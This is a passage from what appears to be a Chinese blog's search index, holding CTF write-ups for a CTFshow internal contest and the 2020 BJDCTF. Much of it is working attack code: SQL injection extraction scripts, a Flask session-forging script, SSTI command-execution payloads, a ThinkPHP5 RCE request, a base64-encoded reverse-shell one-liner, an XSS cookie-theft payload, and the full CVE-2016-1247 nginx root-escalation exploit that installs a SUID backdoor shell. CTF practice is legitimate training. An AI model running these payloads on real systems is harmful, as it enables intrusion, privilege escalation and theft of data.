建议是修改.env中的环境变量,不要修改jwt.php文件,因为jwt.php文件中的配置项大都是从.env中获取的,没有获取到会用默认值","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"php","slug":"php","permalink":"https://yanmymickey.github.io/tags/php/"},{"name":"laravel","slug":"laravel","permalink":"https://yanmymickey.github.io/tags/laravel/"},{"name":"jwt","slug":"jwt","permalink":"https://yanmymickey.github.io/tags/jwt/"}]},{"title":"CTFshow内部赛_WP","date":"2020-03-28T16:00:00.000Z","path":"2020/03/29/CTF_WP/ctfshow_内部赛/","text":"CTFshow内部赛_WPWebWeb1分析1www.zip源码泄露,代码审计,register.php中的黑名单限制较少,分析可得注册的用户名写入seesion,然后直接用session中的用户名待入查询,与2018网鼎杯Unfinish差不多,详情搜索 exp123456789101112131415161718192021222324252627282930313233343536373839import requestsimport re,binasciilogin_url &#x3D; &quot;https:&#x2F;&#x2F;eeb03913-664d-4698-b781-e107f8075ea9.chall.ctf.show&#x2F;login.php&quot;register_url &#x3D; &quot;https:&#x2F;&#x2F;eeb03913-664d-4698-b781-e107f8075ea9.chall.ctf.show&#x2F;register.php&quot;s&#x3D;requests.session()users_email &#x3D; [&quot;test&quot; + str(i) + &quot;@qq.com&quot; for i in range(0,17)]def register(user_email,offset,s): reg_datas &#x3D; &#123; &quot;e&quot; : user_email, #&quot;username&quot; : &quot;0&#39;+(select substr(hex(hex((select * from flag))) from &quot; + str(1+offset*10)+ &quot; for 10))+&#39;0&quot;, # &quot;username&quot;:&quot;test&quot;, &quot;u&quot;:&quot;0&#39;+(select&#x2F;**&#x2F;substr(hex(hex((select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)))&#x2F;**&#x2F;from&#x2F;**&#x2F;&quot; + str(1+offset*10)+ &quot;&#x2F;**&#x2F;for&#x2F;**&#x2F;10))+&#39;0&quot;, &quot;p&quot;:&quot;test&quot; &#125; # print(reg_datas[&#39;username&#39;]) r &#x3D; s.post(url &#x3D; register_url,data &#x3D; reg_datas,allow_redirects&#x3D;True) # print(r.request.body) # print(r.status_code) return rdef login(user_email,s): login_data&#x3D;&#123; &quot;e&quot;:user_email, &quot;p&quot;:&quot;test&quot; &#125; r &#x3D; s.post(url&#x3D;login_url, data&#x3D;login_data, allow_redirects&#x3D;True) pattern &#x3D; &#39;Hello\\s*(\\S*),&#39; return re.findall(pattern,r.text)[0]if __name__ &#x3D;&#x3D; &#39;__main__&#39;: flag_double_hex &#x3D; &#39;&#39;# email&#x3D;&quot;test@mail.com&quot;# offset&#x3D;1 for email,offset in zip(users_email,range(0,len(users_email))): print(email,offset) r&#x3D;register(email,offset,s) test &#x3D; login(email,s) print(test) flag_double_hex +&#x3D; test print(&quot;[+] &quot; + flag_double_hex) print(&quot;flag: &quot; + binascii.a2b_hex(binascii.a2b_hex(flag_double_hex)).decode()) Web2分析查看页面源代码有提示,param:ctfshow key:ican 图片是css都在static文件夹下,没有index.php等等, 随便登录发现要admin,查看cookies,发现是session,想到flask 开始伪造admin的session 伪造脚本123456789101112131415161718192021222324252627282930313233343536# # coding:utf-8from flask.sessions import SecureCookieSessionInterfacefrom itsdangerous import URLSafeTimedSerializerimport hashlibclass SimpleSecureCookieSessionInterface(SecureCookieSessionInterface): # Override method # Take secret_key instead of an instance of a Flask app def get_signing_serializer(self, secret_key): if not secret_key: return None signer_kwargs &#x3D; dict( key_derivation&#x3D;&quot;hmac&quot;, digest_method&#x3D;hashlib.sha1 ) return URLSafeTimedSerializer(secret_key, salt&#x3D;&quot;cookie-session&quot;, serializer&#x3D;self.serializer, signer_kwargs&#x3D;signer_kwargs)def decodeFlaskCookie(secret_key, cookieValue): sscsi &#x3D; SimpleSecureCookieSessionInterface() signingSerializer &#x3D; sscsi.get_signing_serializer(secret_key) return signingSerializer.loads(cookieValue)# Keep in mind that flask uses unicode strings for the# dictionary keysdef encodeFlaskCookie(secret_key, cookieDict): sscsi &#x3D; SimpleSecureCookieSessionInterface() signingSerializer &#x3D; sscsi.get_signing_serializer(secret_key) return signingSerializer.dumps(cookieDict)if __name__&#x3D;&#x3D;&#39;__main__&#39;: sk &#x3D; &quot;ican&quot; sessionDict &#x3D; &#123;&quot;username&quot;:&quot;admin&quot;&#125; cookie &#x3D; encodeFlaskCookie(sk, sessionDict) #decodedDict &#x3D; decodeFlaskCookie(sk, session) print(cookie) 替换test的sesion刷新页面发现缺少参数,添加ctfshow fuzz1234ctfshow&#x3D;1#页面显示1ctfshow&#x3D;&#123;&#123;1*2&#125;&#125;#页面显示2 可知是SSTI payload1?ctfshow&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;proc&#x2F;1&#x2F;environ&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ps -aux发现执行了/flag.sh,但是根目录下面没有,读取proc下面的一些文件试试,得到flag Web3分析题目图片中有cai字样 蚁剑连接,密码是cai flag在/下面,但是没有权限 终端运行ps -aux 得到cron,cron是linux的定时任务,cat /etc/crontab文件得到最下面一行的nginx的日志切片程序,一步步查看文件深入到/var/log目录下,ls -af,得到error.log是root权限,搜一搜得到nginx错误配置error.log root权限的提权漏洞 poc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#!&#x2F;bin&#x2F;bash## Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit# nginxed-root.sh (ver. 1.0)## CVE-2016-1247## Discovered and coded by:## Dawid Golunski# dawid[at]legalhackers.com## https:&#x2F;&#x2F;legalhackers.com## Follow https:&#x2F;&#x2F;twitter.com&#x2F;dawid_golunski for updates on this advisory.## ---# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu# etc.) to escalate their privileges from nginx web server user (www-data) to root # through unsafe error log handling.## The exploit waits for Nginx server to be restarted or receive a USR1 signal.# On Debian-based systems the USR1 signal is sent by logrotate (&#x2F;etc&#x2F;logrotate.d&#x2F;nginx)# script which is called daily by the cron.daily on default installations.# The restart should take place at 6:25am which is when cron.daily executes.# Attackers can therefore get a root shell automatically in 24h at most without any admin# interaction just by letting the exploit run till 6:25am assuming that daily logrotation # has been configured. ### Exploit usage:# .&#x2F;nginxed-root.sh path_to_nginx_error.log ## To trigger logrotation for testing the exploit, you can run the following command:## &#x2F;usr&#x2F;sbin&#x2F;logrotate -vf &#x2F;etc&#x2F;logrotate.d&#x2F;nginx## See the full advisory for details at:# https:&#x2F;&#x2F;legalhackers.com&#x2F;advisories&#x2F;Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html## Video PoC:# https:&#x2F;&#x2F;legalhackers.com&#x2F;videos&#x2F;Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html### Disclaimer:# For testing purposes only. Do no harm.## http:&#x2F;&#x2F;www.debian.cn&#x2F;#BACKDOORSH&#x3D;&quot;&#x2F;bin&#x2F;bash&quot;BACKDOORPATH&#x3D;&quot;&#x2F;tmp&#x2F;nginxrootsh&quot;PRIVESCLIB&#x3D;&quot;&#x2F;tmp&#x2F;privesclib.so&quot;PRIVESCSRC&#x3D;&quot;&#x2F;tmp&#x2F;privesclib.c&quot;SUIDBIN&#x3D;&quot;&#x2F;usr&#x2F;bin&#x2F;sudo&quot;function cleanexit &#123;# Cleanup echo -e &quot;\\n[+] Cleaning up...&quot;rm -f $PRIVESCSRCrm -f $PRIVESCLIBrm -f $ERRORLOGtouch $ERRORLOGif [ -f &#x2F;etc&#x2F;ld.so.preload ]; thenecho -n &gt; &#x2F;etc&#x2F;ld.so.preloadfiecho -e &quot;\\n[+] Job done. Exiting with code $1 \\n&quot;exit $1&#125;function ctrl_c() &#123; echo -e &quot;\\n[+] Ctrl+C pressed&quot;cleanexit 0&#125;#intro cat &lt;&lt;_eascii_ _______________________________&lt; Is your server (N)jinxed ? ;o &gt; ------------------------------- \\ \\ __---__ _- &#x2F;--______ __--( &#x2F; \\ )XXXXXXXXXXX\\v. .-XXX( O O )XXXXXXXXXXXXXXX- &#x2F;XXX( U ) XXXXXXX\\ &#x2F;XXXXX( )--_ XXXXXXXXXXX\\ &#x2F;XXXXX&#x2F; ( O ) XXXXXX \\XXXXX\\ XXXXX&#x2F; &#x2F; XXXXXX \\__ \\XXXXX XXXXXX__&#x2F; XXXXXX \\__----&gt; ---___ XXX__&#x2F; XXXXXX \\__ &#x2F; \\- --__&#x2F; ___&#x2F;\\ XXXXXX &#x2F; ___--&#x2F;&#x3D; \\-\\ ___&#x2F; XXXXXX &#39;--- XXXXXX \\-\\&#x2F;XXX\\ XXXXXX &#x2F;XXXXX \\XXXXXXXXX \\ &#x2F;XXXXX&#x2F; \\XXXXXX &gt; _&#x2F;XXXXX&#x2F; \\XXXXX--__&#x2F; __-- XXXX&#x2F; -XXXXXXXX--------------- XXXXXX- \\XXXXXXXXXXXXXXXXXXXXXXXXXX&#x2F; &quot;&quot;VXXXXXXXXXXXXXXXXXXV&quot;&quot;_eascii_echo -e &quot;\\033[94m \\nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \\nnginxed-root.sh (ver. 1.0)\\n&quot;echo -e &quot;Discovered and coded by: \\n\\nDawid Golunski \\nhttps:&#x2F;&#x2F;legalhackers.com \\033[0m&quot;# Argsif [ $# -lt 1 ]; thenecho -e &quot;\\n[!] Exploit usage: \\n\\n$0 path_to_error.log \\n&quot;echo -e &quot;It seems that this server uses: &#96;ps aux | grep nginx | awk -F&#39;log-error&#x3D;&#39; &#39;&#123; print $2 &#125;&#39; | cut -d&#39; &#39; -f1 | grep &#39;&#x2F;&#39;&#96;\\n&quot;exit 3fi# Priv checkecho -e &quot;\\n[+] Starting the exploit as: \\n\\033[94m&#96;id&#96;\\033[0m&quot;id | grep -q www-dataif [ $? -ne 0 ]; thenecho -e &quot;\\n[!] You need to execute the exploit as www-data user! Exiting.\\n&quot;exit 3fi# Set target pathsERRORLOG&#x3D;&quot;$1&quot;if [ ! -f $ERRORLOG ]; thenecho -e &quot;\\n[!] The specified Nginx error log ($ERRORLOG) doesn&#39;t exist. Try again.\\n&quot;exit 3fi# [ Exploitation ]trap ctrl_c INT# Compile privesc preload libraryecho -e &quot;\\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;sys&#x2F;stat.h&gt;#include &lt;unistd.h&gt;#include &lt;dlfcn.h&gt; #include &lt;sys&#x2F;types.h&gt; #include &lt;sys&#x2F;stat.h&gt; #include &lt;fcntl.h&gt;uid_t geteuid(void) &#123;static uid_t (*old_geteuid)();old_geteuid &#x3D; dlsym(RTLD_NEXT, &quot;geteuid&quot;);if ( old_geteuid() &#x3D;&#x3D; 0 ) &#123;chown(&quot;$BACKDOORPATH&quot;, 0, 0);chmod(&quot;$BACKDOORPATH&quot;, 04777);unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);&#125;return old_geteuid();&#125;_solibeof_&#x2F;bin&#x2F;bash -c &quot;gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl&quot;if [ $? -ne 0 ]; thenecho -e &quot;\\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;cleanexit 2;fi# Prepare backdoor shellcp $BACKDOORSH $BACKDOORPATHecho -e &quot;\\n[+] Backdoor&#x2F;low-priv shell installed at: \\n&#96;ls -l $BACKDOORPATH&#96;&quot;# Safety checkif [ -f &#x2F;etc&#x2F;ld.so.preload ]; thenecho -e &quot;\\n[!] &#x2F;etc&#x2F;ld.so.preload already exists. Exiting for safety.&quot;exit 2fi# Symlink the log filerm -f $ERRORLOG &amp;&amp; ln -s &#x2F;etc&#x2F;ld.so.preload $ERRORLOGif [ $? -ne 0 ]; thenecho -e &quot;\\n[!] Couldn&#39;t remove the $ERRORLOG file or create a symlink.&quot;cleanexit 3fiecho -e &quot;\\n[+] The server appears to be \\033[94m(N)jinxed\\033[0m (writable logdir) ! :) Symlink created at: \\n&#96;ls -l $ERRORLOG&#96;&quot;# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggeredcurl http:&#x2F;&#x2F;localhost&#x2F; &gt;&#x2F;dev&#x2F;null 2&gt;&#x2F;dev&#x2F;null# Wait for Nginx to re-open the logs&#x2F;USR1 signal after the logrotation (if daily # rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)echo -ne &quot;\\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...&quot;while :; do sleep 1if [ -f &#x2F;etc&#x2F;ld.so.preload ]; thenecho $PRIVESCLIB &gt; &#x2F;etc&#x2F;ld.so.preloadrm -f $ERRORLOGbreak;fidone# &#x2F;etc&#x2F;ld.so.preload should be owned by www-data user at this point# Inject the privesc.so shared library to escalate privilegesecho $PRIVESCLIB &gt; &#x2F;etc&#x2F;ld.so.preloadecho -e &quot;\\n[+] Nginx restarted. The &#x2F;etc&#x2F;ld.so.preload file got created with web server privileges: \\n&#96;ls -l &#x2F;etc&#x2F;ld.so.preload&#96;&quot;echo -e &quot;\\n[+] Adding $PRIVESCLIB shared lib to &#x2F;etc&#x2F;ld.so.preload&quot;echo -e &quot;\\n[+] The &#x2F;etc&#x2F;ld.so.preload file now contains: \\n&#96;cat &#x2F;etc&#x2F;ld.so.preload&#96;&quot;chmod 755 &#x2F;etc&#x2F;ld.so.preload# Escalating privileges via the SUID binary (e.g. &#x2F;usr&#x2F;bin&#x2F;sudo)echo -e &quot;\\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&quot;sudo 2&gt;&#x2F;dev&#x2F;null &gt;&#x2F;dev&#x2F;null# Check for the rootshellls -l $BACKDOORPATHls -l $BACKDOORPATH | grep rws | grep -q rootif [ $? -eq 0 ]; then echo -e &quot;\\n[+] Rootshell got assigned root SUID perms at: \\n&#96;ls -l $BACKDOORPATH&#96;&quot;echo -e &quot;\\n\\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\\033[0m&quot;elseecho -e &quot;\\n[!] Failed to get root&quot;cleanexit 2firm -f $ERRORLOGecho &gt; $ERRORLOG # Use the rootshell to perform cleanup that requires root privilges$BACKDOORPATH -p -c &quot;rm -f &#x2F;etc&#x2F;ld.so.preload; rm -f $PRIVESCLIB&quot;# Reset the logging to error.log$BACKDOORPATH -p -c &quot;kill -USR1 &#96;pidof -s nginx&#96;&quot;# Execute the rootshellecho -e &quot;\\n[+] Spawning the rootshell $BACKDOORPATH now! \\n&quot;$BACKDOORPATH -p -i# Job done.cleanexit 0：Debian、ubuntu发行版的Nginx本地提权漏洞（含POC） 将poc上传到/var/www/html/目录下面,更改777权限,更改文件名为poc.sh 在蚁剑的终端中用bash反弹一个shell到vps,然后在vps执行一下命令,等待cron定时任务执行,触发漏洞得到root权限 123cd &#x2F;var&#x2F;www&#x2F;html&#x2F;.&#x2F;poc.sh &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.logcat &#x2F;flag Web5分析fuzz一下只能5个字符,or and =不能用 但是&amp;&amp; || &lt;&gt;可以,只能五个字符,便思考逻辑 1234--猜测后台sqlselect * from table where username&#x3D;&#39;&#39; and password&#x3D;&#39;&#39;--构造逻辑select * from table where username&#x3D;&#39;1&#39;&lt;&#39;2&#39; and password&#x3D;&#39;1&#39;&lt;&#39;2&#39; payload1u&#x3D;1&#39;&lt;&#39;2&amp;p&#x3D;1&#39;&lt;&#39;2 Web6分析eval以分号作为语句分隔符,直接结束前面一段代码另起炉灶 payload12a;phpinfo();a;system(&#39;cat &#x2F;var&#x2F;falg.txt&#39;) flag找一找在var下面 密码密码2下载得到文件,ctf替换.show替换-morse解码在得到了FLAG四个字 然后后面都是四个16进制码一组,utf-8解码得到flag","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"2020第二届BJDCTF","date":"2020-03-22T16:00:00.000Z","path":"2020/03/23/CTF_WP/BJDCTFWP/","text":"2020第二届BJDCTFWEBfakegoogle源码注释是SSTI payload 12&#x2F;qaq?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#x2F;qaq?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; old_hack利用的是thinkphp5的RCE漏洞 payload 12http:&#x2F;&#x2F;a06ef095-a650-4053-96ad-444239c9d4db.node3.buuoj.cn&#x2F;?s&#x3D;captchapost data:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag duangshell下载.index.php.swp, 12vim index.php#按R还原出源码 注册小号申请靶机,ifconfig得到靶机的ip,利用bash构造一句话反弹shell,两次base编码后发送payload payload 1ec&#39;&#39;ho &quot;WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE56UXVNUzQwT0M0M01DODRPRGc0SURBK0pqRT0&#x3D;&quot;|bas&#39;&#39;e64 -d|bas&#39;&#39;e64 -d|bash 简单注入注入脚本 123456789101112131415161718192021222324import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;796d3f72-9ab1-4366-a553-0f1bee62ea1c.node3.buuoj.cn&#x2F;&quot;flag&#x3D;&quot;&quot;for i in range(1,100): high &#x3D; 127 low &#x3D; 32 mid &#x3D; (low + high) &#x2F;&#x2F; 2 while high &gt; low: # password&#x3D;&#39;or ascii(substr(username,%s,1))&gt;%s#&#39;%(str(i),str(mid)) password &#x3D; &#39;or ascii(substr(password,%s,1))&gt;%s#&#39; % (str(i), str(mid)) payload &#x3D; &#123;&#39;username&#39;:&quot;\\\\&quot;, &#39;password&#39;:password&#125; # print(payload) r&#x3D;requests.post(url,data&#x3D;payload) if &#39;BJD needs to be stronger&#39; in r.text: low &#x3D; mid + 1 else: high &#x3D; mid mid &#x3D; (low + high) &#x2F;&#x2F; 2 print(chr(int(mid)),end&#x3D;&quot;&quot;) flag+&#x3D;chr(int(mid)) print(&quot; | &quot;+flag)#结果,登录得到flagadminOhyOuFOuNdit 假猪套天下第一登录admin提示不是admin,随便输一个test,登录上,抓包发现注释L0g1n.php 访问L0g1n.php.php 1234567891011121314151617181920212223242526272829303132333435363738#提示Sorry, this site will be available after totally 99 years!#查看cookies发现有个time改成9999999999#提示Sorry, this site is only optimized for those who comes from localhost修改X-Forwarded-For:127.0.0.1#提示Do u think that I dont know X-Forwarded-For?Too young too simple sometimes naive#修改Client-IP:127.0.0.1#提示Sorry, this site is only optimized for those who come from gem-love.com#修改Referer:gem-love.com#提示Sorry, this site is only optimized for browsers that run on Commodo 64#修改User-Agent:Commodo 64#提示no no no i think it is not the real commmodo 64,what is the real ua for Commdo?#google commmodo 64有一中计算机叫Commodore 64#修改User-Agent:Commodore 64#提示Sorry, this site is only optimized for those whose email is root@gem-love.com#google http head email 发现有一个头叫from#修改From:root@gem-love.com#提示Sorry, this site is only optimized for those who use the http proxy of y1ng.vip if you dont have the proxy, pls contact us to buy, ￥100&#x2F;Month#Via 代理服务器的相关信息#修改Via:y1ng.vip#F12查看元素&lt;!--ZmxhZ3tlYzI2ZmNhMS1mYWRmLTQ0YmItYTEyYS1lNjdjOWU5NTg3Nzh9Cg&#x3D;&#x3D;--&gt;base64解码flag&#123;ec26fca1-fadf-44bb-a12a-e67c9e958778&#125; Schrödinger查看网页源代码有个test.php,过去看一眼是登录框,首页是一个密码爆破,于是让他自己爆破自己 登录框输入http://127.0.0.1/test.php,按input,弹窗提示URL Confirmed.查看cookies dXNlcg=MTU4NTAxNTkwMw%3D%3Dbase64解码得到user=1585015903,用edit cookies插件置空,刷新页面99%了,点check,得到av号,查看评论区按时间排序,查看最近的评论,得到flag XSS之光扫目录发现git泄露,githack恢复得到源代码 123456789&lt;?php$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];echo unserialize($a);&lt;?php#利用原生类xss$a &#x3D; new Exception(&#39;&lt;script&gt;window.open(document.cookie);&lt;&#x2F;script&gt;&#39;);#由于源代码有个echo直接反序列化字符串$a &#x3D; &#39;&lt;script&gt;window.open(document.cookie);&lt;&#x2F;script&gt;&#39;;echo urlencode(serialize($a)); 传过去得到flag elementmaster检查元素发现 12&lt;p hidden&#x3D;&quot;&quot; id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;&lt;p hidden&#x3D;&quot;&quot; id&#x3D;&quot;706870&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;p&gt; hex解码得到Po.php 使用bp遍历元素周期表中的元素.php 得到And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php,访问得到flag 文件探测head里面有hint home.php 访问,发现url包含了system.php 使用伪协议 12&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;system&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;home 得到源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110&#x2F;&#x2F;system.php&lt;?phperror_reporting(0);if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123; echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;; header(&quot;Refresh:0.1;url&#x3D;index.php&quot;); die;&#125;$str2 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;$str3 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;$str4 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;&lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt; &lt;title&gt;File Detector&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt; &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;section&gt; &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;div class&#x3D;&quot;simform-inner&quot;&gt; &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt; &lt;ol class&#x3D;&quot;questions&quot;&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你知道目录下都有什么文件吗?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;请输入你想检测文件内容长度的url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你希望以何种方式访问？GET？POST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;&#x2F;ol&gt; &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt; &lt;div class&#x3D;&quot;controls&quot;&gt; &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt; &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt; &lt;span class&#x3D;&quot;number&quot;&gt; &lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;form&gt; &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;&lt;&#x2F;section&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; var theForm &#x3D; document.getElementById( &#39;theForm&#39; ); new stepsForm( theForm, &#123; onSubmit : function( form ) &#123; classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; ); var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; ); form.submit(); messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;; classie.addClass( messageEl, &#39;show&#39; ); &#125; &#125; );&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php$filter1 &#x3D; &#39;&#x2F;^http:\\&#x2F;\\&#x2F;127\\.0\\.0\\.1\\&#x2F;&#x2F;i&#39;;$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123; $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;; $method &#x3D; $_POST[&#39;q3&#39;]; $str1 &#x3D; &quot;~$ python fuck.py -u \\&quot;&quot;.$url .&quot;\\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;; echo $str1; if (!preg_match($filter1, $url) )&#123; die($str2); &#125; if (preg_match($filter2, $url)) &#123; die($str3); &#125; if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123; die($str4); 